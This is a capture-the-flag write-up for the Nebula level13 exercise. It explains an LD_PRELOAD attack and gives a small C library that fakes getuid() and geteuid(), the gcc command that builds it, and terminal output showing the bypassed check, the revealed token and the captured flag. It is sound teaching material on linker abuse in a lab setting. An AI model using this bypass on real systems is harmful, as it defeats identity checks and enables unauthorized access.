**Intro**

This lessons takes advantage of the ability to poison LD_PRELOAD with a shared library that overrides the expected results.

An excellent article on dynamic linking can be found at [Breaking the links: Exploiting the linker (PDF)](https://www.nth-dimension.org.uk/pub/BTL.pdf).

The brief explanation is that by setting an LD_PROLOAD value, the binary will check the injected library for the function call it needs, in this case ***getuid()*** and use it instead of the systems getuid() function.  Doing so allows an attacker to inject an arbitrary return result and bypass the weak security mechanism of the application.

For this exercise it isn't necessary for the binary to be suid. The token is in the binary and the objective is to simply fool the application into believing it is being executed by their *FAKEUID 1000.*

To accomplish this I wrote a [bash script](../resources/level13_exploit.sh) which takes advantage of the LD_PRELOAD environment variable.  The bash script also compiles a shared library from this code

**libFakeAs{USER}.c**

```
﻿int getuid() {
    return FAKE_UID;
}

int geteuid() {
    return FAKE_UID;
    }
```



Which is then compiled as shown

```
﻿/usr/bin/gcc -fPIC -shared -DFAKE_UID=`/usr/bin/id -u $FAKE_AS` -o /tmp/libFakeAs${FAKE_AS}.so /tmp/libFakeAs${FAKE_AS}.c
```



**Exploit in Action**

```
﻿level13@nebula:~$ ls
flag13  level13_exploit.sh
level13@nebula:~$ ./level13_exploit.sh nebula ./flag13 
Faking user nebula with UID 1000
LD_PRELOAD poisoned with /tmp/libFakeAsnebula.so
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
level13@nebula:~$ 
```



With the token in hand the flag can be captured

**CTF**

```
﻿level13@nebula:~$ su - flag13
Password: 
flag13@nebula:~$ getflag
You have successfully executed getflag on a target account
flag13@nebula:~$ 
```



*Archived Copy of Breaking the Links*

[Breaking the Links: Exploiting the Linker (PDF)](../resources/BTL.pdf)